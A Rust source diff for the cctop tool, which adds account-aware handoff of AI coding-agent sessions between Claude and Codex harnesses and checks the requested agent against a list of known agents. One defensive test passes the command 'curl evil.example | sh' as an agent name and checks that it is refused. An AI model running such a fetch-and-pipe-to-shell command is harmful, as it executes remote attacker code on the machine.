@@ -349,13 +349,26 @@ fn profile_of(session: &Session) -> Option<&'static crate::config::Profile> {
     crate::config::profile_named(session.provider, name)
 }
 
-/// Write `session`'s brief and start `agent` on it, in the same directory.
+/// Write `session`'s brief and start `target` on it, in the same directory.
 ///
 /// This is the cross-harness move: a resume puts the same harness back on the
 /// same transcript, and a handoff carries what the session was doing across to
 /// a different agent entirely — the one thing no harness can do for itself,
-/// since each can only read its own transcripts.
-pub fn handoff(session: &Session, data: Option<&SessionData>, agent: &str) -> Result<Done, Failed> {
+/// since each can only read its own transcripts. Or to the same harness under
+/// another account, which is the move to make when one subscription has run
+/// out of window and another has not.
+///
+/// The (agent, account) pair has to be one [`handoff::targets`] offers for this
+/// session, not merely one that parses. That is the same list the page drew
+/// its menu from, so it is what keeps an account name away from a directory it
+/// does not name, and the session from being handed to the account it is
+/// already on.
+pub fn handoff(
+    session: &Session,
+    data: Option<&SessionData>,
+    agent: &str,
+    account: Option<&str>,
+) -> Result<Done, Failed> {
     local(session)?;
     // The agent has to be one cctop knows, not a command from the request. A
     // string that reaches `Command::new` from a socket is a remote shell with
@@ -366,21 +379,50 @@ pub fn handoff(session: &Session, data: Option<&SessionData>, agent: &str) -> Re
             format!("{agent} is not an agent cctop found on this machine"),
         ));
     }
+    let wanted = handoff::Target {
+        agent: agent.to_string(),
+        account: account
+            .map(str::trim)
+            .filter(|a| !a.is_empty())
+            .map(str::to_string),
+    };
+    let Some(target) = handoff::targets(session).into_iter().find(|t| *t == wanted) else {
+        return Err((
+            400,
+            format!(
+                "{} is not somewhere this session can be handed — it is the \
+                 account the session is already on, or one cctop does not know",
+                wanted.label()
+            ),
+        ));
+    };
     // Claude to Claude there is a better handoff than a summary: the receiving
     // agent reads the same transcript format the sending one wrote, so it can be
     // resumed onto a copy of the conversation itself. `handoff::fork` says what
     // that costs and why it is still the right trade.
-    if agent == "claude"
+    if target.agent == "claude"
         && let Some(transcript) = handoff::forkable(session)
     {
-        return forked(session, transcript);
+        return forked(session, transcript, &target);
+    }
+    // Codex to Codex is only ever a change of account — the session's own pair
+    // is never offered — and the receiving login reads the rollout as written.
+    if let Some(copied) = codex_forked(session, &target) {
+        match copied {
+            Ok(done) => return Ok(done),
+            Err(reason) => crate::elog::event(
+                "handoff",
+                "codex-fork-fallback",
+                serde_json::json!({ "account": target.account, "reason": reason }),
+            ),
+        }
     }
     // Between two harnesses that keep a file of JSON lines, the same trade is
     // available by transcode rather than by copy: `crate::convert` reads one
     // store and writes the other, and the receiving agent resumes onto that.
     // Only reached when the copy above did not apply, so a Claude session going
     // to Claude still keeps every record the copy carries over byte for byte.
-    if let Some(converted) = converted(session, agent) {
+    if let Some(converted) = converted(session, &target) {
         return match converted {
             Ok(converted) => Ok(converted),
             // A conversion that could not be written is not a failure of the
@@ -390,13 +432,13 @@ pub fn handoff(session: &Session, data: Option<&SessionData>, agent: &str) -> Re
                 crate::elog::event(
                     "handoff",
                     "convert-fallback",
-                    serde_json::json!({ "agent": agent, "reason": reason }),
+                    serde_json::json!({ "agent": target.agent, "reason": reason }),
                 );
-                brief_handoff(session, data, agent)
+                brief_handoff(session, data, &target)
             }
         };
     }
-    brief_handoff(session, data, agent)
+    brief_handoff(session, data, &target)
 }
 
 /// Hand a session over as a brief: a markdown summary the receiving agent is
@@ -408,14 +450,15 @@ pub fn handoff(session: &Session, data: Option<&SessionData>, agent: &str) -> Re
 fn brief_handoff(
     session: &Session,
     data: Option<&SessionData>,
-    agent: &str,
+    target: &handoff::Target,
 ) -> Result<Done, Failed> {
     let brief = handoff::build(session, data);
     let path = handoff::write(&brief)
         .map_err(|e| (503, format!("could not write the handoff brief: {e}")))?;
     let line = handoff::prompt_for(&path);
 
-    let argv = vec![agent.to_string()];
+    let agent = target.agent.as_str();
+    let argv = target.argv(vec![agent.to_string()]);
     // Handed over in the argv wherever the harness takes an opening prompt.
     // `handoff::opening_argv` documents why that is not the same as typing it:
     // an agent still asking the terminal what it can do eats part of whatever
@@ -427,6 +470,7 @@ fn brief_handoff(
         &name,
         session.work_dir().as_deref(),
     )?;
+    record_account(&name, target);
 
     if opening.is_none() {
         // Nowhere to put the brief but the keyboard, and not until the agent is
@@ -442,47 +486,63 @@ fn brief_handoff(
     }
     Ok(Done {
         message: format!(
-            "Handed {} to {agent} — attach with `rmux attach -t {name}`",
-            brief.summary()
+            "Handed {} to {} — attach with `rmux attach -t {name}`",
+            brief.summary(),
+            target.label()
         ),
         rmux: Some(name),
     })
 }
 
-/// The transcode of this session into `agent`'s store, if cctop can do one.
+/// Write down which account the agent in `name` runs under, so the terminal
+/// UI's tab for it says so.
+///
+/// The default account writes nothing, which is what an unset option already
+/// means — see [`crate::rmux::set_profile`].
+fn record_account(name: &str, target: &handoff::Target) {
+    if let Some(account) = target.account.as_deref().filter(|a| *a != "default") {
+        crate::rmux::set_profile(name, account);
+    }
+}
+
+/// The transcode of this session into `target`'s store, if cctop can do one.
 ///
 /// `None` for a pair that cannot be converted, and for a session with no
 /// transcript on this disk to read — either way the caller has a brief to fall
 /// back on, so the distinction matters only in what gets written.
-fn converted(session: &Session, agent: &str) -> Option<Result<Done, String>> {
+fn converted(session: &Session, target: &handoff::Target) -> Option<Result<Done, String>> {
     if !crate::convert::convertible_session(session) {
         return None;
     }
-    let target = crate::pricing::Provider::parse(agent)?;
-    if !crate::convert::convertible(session.provider, target) {
+    let provider = crate::pricing::Provider::parse(&target.agent)?;
+    if !crate::convert::convertible(session.provider, provider) {
         return None;
     }
     let transcript = session.data_file.as_deref()?;
     // The receiving account's store, not the sending one's: handing a personal
     // session to a work login has to write it where that login will look.
-    let home = default_home(target)?;
+    let home = home_of(target)?;
     Some(
-        crate::convert::convert(session.provider, transcript, target, &home)
+        crate::convert::convert(session.provider, transcript, provider, &home)
             .ok_or_else(|| "the transcript could not be read or written in that format".to_string())
-            .and_then(|written| resume_converted(session, &written)),
+            .and_then(|written| resume_converted(session, &written, target)),
     )
 }
 
-/// The store `target` keeps its sessions in.
+/// The store `target` keeps its sessions in: its account's directory, or the
+/// harness's conventional one when it names none.
 ///
-/// The conventional directory rather than a named account's: a converted
-/// session is written for whoever resumes it, and the launcher picks which
-/// account that is by setting the harness's environment variable in the argv it
-/// runs. Writing into `~/.claude` and launching a work login would leave the
-/// copy where the work login never looks, which is the same mistake
-/// [`crate::handoff::fork`] avoids by taking the profile explicitly.
-fn default_home(target: crate::pricing::Provider) -> Option<std::path::PathBuf> {
-    Some(match target {
+/// A converted or copied session is written for whoever resumes it, so it goes
+/// where the receiving account looks. A token account names the conventional
+/// directory, which is where its history lives anyway. Writing into `~/.claude`
+/// and launching a work login would leave the copy where the work login never
+/// looks, which is the mistake [`crate::handoff::fork`] avoids by taking the
+/// directory explicitly.
+fn home_of(target: &handoff::Target) -> Option<std::path::PathBuf> {
+    if let Some(profile) = target.profile() {
+        return Some(profile.dir.clone());
+    }
+    Some(match crate::pricing::Provider::parse(&target.agent)? {
         crate::pricing::Provider::Claude => crate::config::CLAUDE_CONFIG_DIR.clone(),
         crate::pricing::Provider::Codex => crate::config::CODEX_HOME.clone(),
         _ => return None,
@@ -498,10 +558,11 @@ fn default_home(target: crate::pricing::Provider) -> Option<std::path::PathBuf> 
 fn resume_converted(
     session: &Session,
     converted: &crate::convert::Converted,
+    target: &handoff::Target,
 ) -> Result<Done, String> {
-    let target = converted.provider;
-    let agent = target.as_str();
-    let argv = match target {
+    let provider = converted.provider;
+    let agent = provider.as_str();
+    let argv = match provider {
         crate::pricing::Provider::Claude => vec![
             "claude".to_string(),
             "--resume".to_string(),
@@ -514,6 +575,7 @@ fn resume_converted(
         ],
         _ => return Err("that harness has no resume command cctop knows".into()),
     };
+    let argv = target.argv(argv);
     let name = crate::rmux::free_name(agent);
     // Launched from the session's own directory, which is what the converted
     // transcript recorded as its `cwd` — and both harnesses filter their resume
@@ -521,6 +583,7 @@ fn resume_converted(
     // see the conversation it was just handed.
     let cwd = session.work_dir();
     launch(&argv, &name, cwd.as_deref()).map_err(|(_, why)| why)?;
+    record_account(&name, target);
     // The id is named because it usually *is* the source session's, and a user
     // comparing the two stores will want to know whether it was kept. When it
     // was not, the marker written into the transcript still says which session
@@ -544,7 +607,8 @@ fn resume_converted(
     );
     Ok(Done {
         message: format!(
-            "Handed the conversation to a new {agent} {note} — attach with `rmux attach -t {name}`"
+            "Handed the conversation to a new {} {note} — attach with `rmux attach -t {name}`",
+            target.label()
         ),
         rmux: Some(name),
     })
@@ -554,40 +618,70 @@ fn resume_converted(
 ///
 /// The two agents share everything said so far and nothing after it: the copy
 /// is what keeps this a handoff rather than two agents appending to one
-/// transcript, which is the thing [`resume`] refuses to do.
-fn forked(session: &Session, transcript: &std::path::Path) -> Result<Done, Failed> {
-    let profile = profile_of(session);
-    let config_dir = profile
-        .map(|p| p.dir.clone())
-        .unwrap_or_else(|| crate::config::CLAUDE_CONFIG_DIR.clone());
+/// transcript, which is the thing [`resume`] refuses to do. The copy goes into
+/// the receiving account's directory and the agent is started under it, so a
+/// session moved off an exhausted login spends the other one.
+fn forked(
+    session: &Session,
+    transcript: &std::path::Path,
+    target: &handoff::Target,
+) -> Result<Done, Failed> {
+    let config_dir = home_of(target).unwrap_or_else(|| crate::config::CLAUDE_CONFIG_DIR.clone());
     let id = handoff::fork(transcript, &config_dir)
         .map_err(|e| (503, format!("could not copy the transcript: {e}")))?;
-    let argv = under_profile(
-        session,
-        vec!["claude".into(), "--resume".into(), id.clone()],
-    );
+    let argv = target.argv(vec!["claude".into(), "--resume".into(), id]);
     // A fresh id, so unlike a resume there is nothing to be idempotent about:
     // the copy has never been opened by anything.
     let name = crate::rmux::free_name("claude");
     launch(&argv, &name, session.work_dir().as_deref())?;
+    record_account(&name, target);
     Ok(Done {
         message: format!(
-            "Handed the conversation to a new claude — attach with `rmux attach -t {name}`"
+            "Handed the conversation to a new {} — attach with `rmux attach -t {name}`",
+            target.label()
         ),
         rmux: Some(name),
     })
 }
 
-/// The agents on this machine a session can be handed to.
+/// Copy this Codex session's rollout into another Codex account and resume it
+/// there, when that is what `target` is.
 ///
-/// The same list the terminal launcher offers, minus the shell: handing a brief
-/// to `$SHELL` would start a shell with a paragraph typed into it.
+/// `None` when it is not — another harness, or a session with no rollout on
+/// this disk. An `Err` is a copy that failed, which the caller answers with a
+/// brief rather than with a failure.
+fn codex_forked(session: &Session, target: &handoff::Target) -> Option<Result<Done, String>> {
+    if target.agent != "codex"
+        || session.provider != crate::pricing::Provider::Codex
+        || !crate::convert::convertible_session(session)
+    {
+        return None;
+    }
+    let rollout = session.data_file.as_deref()?;
+    let home = home_of(target)?;
+    let id = match handoff::fork_codex(rollout, &home) {
+        Ok(id) => id,
+        Err(e) => return Some(Err(e.to_string())),
+    };
+    let argv = target.argv(vec!["codex".into(), "resume".into(), id]);
+    let name = crate::rmux::free_name("codex");
+    if let Err((_, why)) = launch(&argv, &name, session.work_dir().as_deref()) {
+        return Some(Err(why));
+    }
+    record_account(&name, target);
+    Some(Ok(Done {
+        message: format!(
+            "Handed the conversation to a new {} — attach with `rmux attach -t {name}`",
+            target.label()
+        ),
+        rmux: Some(name),
+    }))
+}
+
+/// The agents on this machine a session can be handed to — see
+/// [`handoff::agents`], which the launcher's handoff asks too.
 pub fn agents() -> Vec<String> {
-    crate::alias::AGENTS
-        .split_whitespace()
-        .filter(|agent| crate::shim::is_command(agent))
-        .map(str::to_string)
-        .collect()
+    handoff::agents()
 }
 
 /// Put `argv` in a detached rmux session called `name`.
@@ -633,23 +727,6 @@ fn local(session: &Session) -> Result<(), Failed> {
     }
 }
 
-/// Mint a link to this session's own terminal, for the page to frame.
-///
-/// Only reaches an agent cctop handed to the multiplexer — the same limit `a`
-/// and `W` have in the terminal, and for the same reason: an agent on cctop's
-/// own pty is on no terminal a second viewer can be pointed at.
-///
-/// One share per session, reused — see [`crate::rmux::share_link`]. A link
-/// minted afresh on every ask left a row in `rmux web-share list` per page
-/// reload and, because each tunnelled one dials a rate-limited public relay,
-/// eventually came back untunnelled. Reusing it also matches what is true:
-/// there is one terminal here, however many people are looking at the page.
-///
-/// rmux raises the tunnel — see [`crate::rmux::web_share`] for why cctop's own
-/// one cannot carry a share — and a machine with no way out falls back to a
-/// loopback link rather than to nothing. Which of the two it got is in the
-/// answer, because a link that only opens on the server's own desk is not a
-/// failure the reader can see.
 /// The frontend a page asked its terminal to open in: its own origin's copy of
 /// rmux's app at `/term/`. Only a bare `http(s)://host[:port]` is taken — a
 /// path, a query or another scheme is a request this page never sends — and
@@ -665,6 +742,23 @@ pub fn frontend_for(origin: &str) -> Option<String> {
     host_ok.then(|| format!("{origin}/term/"))
 }
 
+/// Mint a link to this session's own terminal, for the page to frame.
+///
+/// Only reaches an agent cctop handed to the multiplexer — the same limit `a`
+/// and `W` have in the terminal, and for the same reason: an agent on cctop's
+/// own pty is on no terminal a second viewer can be pointed at.
+///
+/// One share per session, reused — see [`crate::rmux::share_link`]. A link
+/// minted afresh on every ask left a row in `rmux web-share list` per page
+/// reload. Reusing it also matches what is true: there is one terminal here,
+/// however many people are looking at the page.
+///
+/// The socket takes the road the page came by, through cctop's relay — see
+/// [`crate::rmux::share_link_with`] — and a machine with no way out falls back
+/// to a loopback link rather than to nothing. Which of the two it got is in
+/// the answer, because a link that only opens on the server's own desk is not
+/// a failure the reader can see.
+///
 /// `fresh` mints a new share instead of handing out the one held — what the
 /// page asks for when the link it was given would not connect.
 pub fn terminal(
@@ -850,7 +944,7 @@ mod tests {
         for (status, message) in [
             send(&session, "hello").unwrap_err(),
             resume(&session).unwrap_err(),
-            handoff(&session, None, "claude").unwrap_err(),
+            handoff(&session, None, "claude", None).unwrap_err(),
         ] {
             assert_eq!(status, 409);
             assert!(message.contains("build-box"), "{message}");
@@ -861,7 +955,8 @@ mod tests {
     /// cctop found on this machine rather than taken from the request.
     #[test]
     fn a_handoff_target_that_is_not_a_known_agent_is_refused() {
-        let (status, message) = handoff(&session(), None, "curl evil.example | sh").unwrap_err();
+        let (status, message) =
+            handoff(&session(), None, "curl evil.example | sh", None).unwrap_err();
         assert_eq!(status, 400);
         assert!(message.contains("not an agent"), "{message}");
     }
